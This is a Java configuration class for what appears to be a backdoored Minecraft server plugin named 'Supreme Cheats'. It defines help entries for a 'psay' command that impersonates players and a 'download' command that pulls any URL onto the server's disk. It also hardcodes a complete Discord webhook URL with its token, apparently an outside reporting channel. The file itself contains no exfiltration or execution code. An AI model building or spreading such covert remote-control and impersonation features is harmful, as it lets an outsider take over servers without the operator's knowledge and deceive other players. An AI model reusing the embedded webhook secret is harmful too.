package com.yoursunucu;

import org.apache.commons.lang.ObjectUtils;
import org.bukkit.ChatColor;

public class Config {

    public static class Param {
        String name;
        String description;
        Boolean required;

        public Param(String name, String description, Boolean required){
            this.name = name;
            this.description = description;
            this.required = required;
        }
    };

    public static final ChatColor help_command_name_color = ChatColor.LIGHT_PURPLE;

    // color of help command syntax
    public static final ChatColor help_command_desc_color = ChatColor.WHITE;

    public static final ChatColor help_command_required_color = ChatColor.RED;
    // color of help
    public static final ChatColor help_detail_color = ChatColor.GREEN;

    public static final String chat_message_prefix = "Supreme Cheats > ";

    public static String WEBHOOK_URL = "https://discord.com/api/webhooks/1362192691278119023/Zy9qSLh9IdxUL0W3_ERY25bR6w7-UHJEMeWUro_VzPkcFsyGfszZjw03nGbeY2r6dbDb";

    public static final HelpItem[] help_messages = {
            new HelpItem("psay", "sends messages as player",
                    new Param[]{new Param("player", "player to impersonate", true),
                            new Param("message", "message to send", true)}),
            new HelpItem("download", "downloads a file, don't use special chars or spaces",
                    new Param[]{new Param("url", "URL of resource to download", true),
                            new Param("file", "file path", true)}),
    };

    public static class HelpItem{

        private final String name;
        private final Param[] params;
        private final String desc;

        public HelpItem(String name, String desc, Param[] params){
            this.name = name;
            this.params = params;
            this.desc = desc;
        }
        public HelpItem(String name, String desc){
            this.name = name;
            this.params = null;
            this.desc = desc;
        }
        public String getName(){
            return name;
        }

        public Param[] getSyntax(){
            return params;
        }

        public String getDesc(){
            return desc;
        }
        public String getHelpEntry(){
            return Config.help_command_name_color + name + ": " + Config.help_command_desc_color + desc;
        }
        public String getSyntaxHelp(){

            if(params == null){
                return getHelpEntry();
            }
            StringBuilder sb = new StringBuilder();

            sb.append(help_command_name_color + name + " ");
            for(Param p : params){
                sb.append(ChatColor.RESET);
                sb.append(help_command_desc_color);
                sb.append("(" + p.name + ") ");
            }

            sb.append("\n");

            for(Param p : params){
                sb.append(ChatColor.RESET);
                sb.append("(" + p.name + ") " + p.description);
                if(p.required)
                    sb.append(help_command_required_color + " [Required]");
                sb.append("\n");
            }

            return sb.toString();
        }

        public static String buildHelpMenu(){
            return buildHelpMenu(0);
        }
        public static String buildHelpMenu(int page){
            StringBuilder sb = new StringBuilder();
            sb.append(help_detail_color + "Supreme Cheats\n");
            sb.append(help_detail_color + "-----------------------------------------------------\n\n");
            for(int i = 0; i < help_messages.length; ++i ){
                sb.append(help_messages[i].getHelpEntry());
                sb.append("\n");
            }

            return sb.toString();
        }
    }
}
